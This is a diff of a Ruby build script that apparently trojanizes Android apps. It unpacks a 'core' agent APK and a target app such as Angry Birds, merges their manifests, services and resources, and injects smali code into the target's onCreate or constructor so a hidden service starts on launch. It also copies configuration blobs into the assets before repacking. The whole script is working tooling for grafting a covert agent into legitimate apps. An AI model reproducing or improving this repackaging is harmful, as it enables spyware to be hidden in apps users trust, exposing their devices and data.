@@ -5,6 +5,8 @@ require 'pp'
 
 BASE="C:/HT/Reversing/Android/dex2jar-0.0.9.9"
 
+# Unable to start service Intent { cmp=com.rovio.angrybirds/com.android.networking.ServiceCore }
+
 def unpack(filename)
 	print "unpack #{filename}\n"
 	
@@ -18,13 +20,30 @@ def unpack(filename)
 	return File.basename(filename, '.*')
 end
 
+def mergeXml(from, to, key)
+	print "merge #{from} #{to} #{key}\n"
+	
+	xt = XmlSimple.xml_in to
+	
+	if(File.exists? from) then
+		xml = XmlSimple.xml_in from				
+		xml[key] += xt[key]		
+		pp xml[key]
+	else
+		xml = xt
+	end
+			
+	return xml
+end
+
 def parseStyle(rcsdir, pkgdir)
-	stylercs = XmlSimple.xml_in("#{rcsdir}/res/values/styles.xml")
-	stylepkg = XmlSimple.xml_in("#{pkgdir}/res/values/styles.xml")
+	style = mergeXml("#{pkgdir}/res/values/styles.xml","#{rcsdir}/res/values/styles.xml","style")	
+	color = mergeXml("#{pkgdir}/res/values/colors.xml","#{rcsdir}/res/values/colors.xml","color")
+		
+	manifestStyle = XmlSimple.xml_out(style)
+	manifestCol =  XmlSimple.xml_out(color)
 	
-	
-	colrcs = XmlSimple.xml_in("#{rcsdir}/res/values/color.xml")
-	colpkg = XmlSimple.xml_in("#{pkgdir}/res/values/color.xml")
+	return manifestStyle, manifestCol
 end
 
 def parseManifest(rcsdir, pkgdir)
@@ -52,6 +71,12 @@ def parseManifest(rcsdir, pkgdir)
 	xmlpkg["application"][0]["receiver"] += xmlrcs["application"][0]["receiver"]
 	xmlpkg["application"][0]["activity"] += xmlrcs["application"][0]["activity"]
 	
+	if(xmlpkg["application"][0].has_key? "service") then
+		xmlpkg["application"][0]["service"] += xmlrcs["application"][0]["service"]
+	else
+		xmlpkg["application"][0]["service"] = xmlrcs["application"][0]["service"]
+	end
+	
 	manifest = XmlSimple.xml_out(xmlpkg);
 
 	return name, manifest
@@ -68,6 +93,27 @@ def patchManifest(rcsdir, manifest)
 	file.close
 end
 
+def patchStyle(rcsdir, style, color)
+	print "patch Style\n"
+	pp style
+	file = File.new("#{rcsdir}/res/values/styles.xml", "w")
+	style.insert(0,"<?xml version=\"1.0\" encoding=\"utf-8\"?>\n")
+	style["<opt"]="<resources"
+	style["</opt"]="</resources"
+	file.write(style)
+	file.close
+	
+	print "patch Color\n"
+	pp color
+	file = File.new("#{rcsdir}/res/values/colors.xml", "w")
+	color["<opt"]="<resources"
+	color["</opt"]="</resources"
+	color.insert(0,"<?xml version=\"1.0\" encoding=\"utf-8\"?>\n")
+	file.write(color)
+	file.close
+	
+end
+
 def patchMain(rcsdir, mainpack)
 	print "patch main #{mainpack}\n"
 	#arr = mainpack.split('.')[0..-2].join('/')	
@@ -79,11 +125,16 @@ def patchMain(rcsdir, mainpack)
 	contentFile = File.new(filepath, "r")
 	content=contentFile.read
 	contentFile.close
+		
+	oncreates=[".method public onCreate(Landroid/os/Bundle;)V", ".method protected onCreate(Landroid/os/Bundle;)V", ".method public constructor <init>()V"]
 	
-	oncreate=".method public onCreate(Landroid/os/Bundle;)V"
-	pos = content.index(oncreate);
-	print "pos = #{pos}\n"
-	
+	oncreates.each{ |oncreate|		
+		@pos = content.index(oncreate);
+		@size = oncreate.size()
+		print "pos = #{@pos}\n"
+		break if @pos != nil
+	}
+		
 	methodFile=File.new("methodStartService.txt", "r")
 	method = methodFile.read
 	methodFile.close
@@ -91,11 +142,11 @@ def patchMain(rcsdir, mainpack)
 	invoke = "    invoke-direct {p0}, L$APPNAME$;->startService()V\n"
 	invoke["$APPNAME$"]=filename
 	
-	content.insert(pos + oncreate.size() +1 , invoke )
+	content.insert(@pos + @size +1 , invoke )
 		
 	method["$APPNAME$"]=filename
 	
-	content.insert(pos, method)
+	content.insert(@pos, method)
 		
 	contentFile = File.new(filepath, "w")
 	contentFile.write(content)
@@ -127,18 +178,25 @@ def pack(dirname)
 	print "packed #{outfile}\n"
 end
 
+def patchConfig(rcsdir)
+	FileUtils.cp "../../server/repack/assets/c.bin", "#{rcsdir}/assets"
+	FileUtils.cp "../../server/repack/assets/r.bin", "#{rcsdir}/assets"
+end
+
 def main(package)
 	rcsdir=unpack("core.android.release.apk")
 	pkgdir=unpack(package)
 	
 	mainpack, newmanifest = parseManifest(rcsdir, pkgdir)
-	#style,color = parseStyle(rcsdir)
+	style,color = parseStyle(rcsdir, pkgdir)
 	
 	merge(rcsdir,pkgdir)
 	
 	patchMain(rcsdir, mainpack)	
-	patchManifest(rcsdir, newmanifest)
-	#patchStyle(rcsdir, style,color)
+	patchManifest(rcsdir, newmanifest)	
+	patchStyle(rcsdir, style,color)
+	
+	patchConfig(rcsdir)
 	
 	print "moving #{pkgdir} in #{rcsdir}\n"
 	FileUtils.mv(pkgdir,"tmp")
@@ -154,6 +212,10 @@ def test()
 	#FileUtils.mv(rcsdir, "./#{pkgdir}")
 	mainpack, newmanifest = parseManifest(rcsdir, pkgdir)
 	patchManifest(rcsdir, newmanifest)
+	
+	style,color = parseStyle(rcsdir, pkgdir)
+	patchStyle(rcsdir, style, color)
 end
 
 main ARGV[0]
+#test
